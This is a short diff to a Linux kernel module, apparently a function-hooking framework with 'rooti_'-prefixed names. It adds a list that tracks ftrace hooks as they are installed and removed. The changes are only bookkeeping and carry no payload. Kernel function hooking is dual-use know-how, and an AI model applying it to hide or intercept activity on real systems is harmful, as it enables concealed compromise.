@@ -1,5 +1,8 @@
+#include <linux/list.h>
 #include "hooking.h"
 #include "utils.h"
+
+LIST_HEAD(rooti_active_hooks);
 
 /*
     Saves a reference to the original function we hook. If the recursion protection mechanism in use
@@ -68,6 +71,9 @@ int rooti_install_func_hook(struct rooti_func_hook *hook)
         return err;
     }
 
+    INIT_LIST_HEAD(&hook->list);
+    list_add_tail(&hook->list, &rooti_active_hooks);
+
     return 0;
 }
 
@@ -84,6 +90,8 @@ void rooti_uninstall_func_hook(struct rooti_func_hook *hook)
     err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
     if (err)
         ROOTI_DEBUG("ftrace_set_filter_ip() failed: %d", err);
+
+    list_del(&hook->list);
 }
 
 int rooti_install_func_hooks(struct rooti_func_hook *hooks, size_t count)
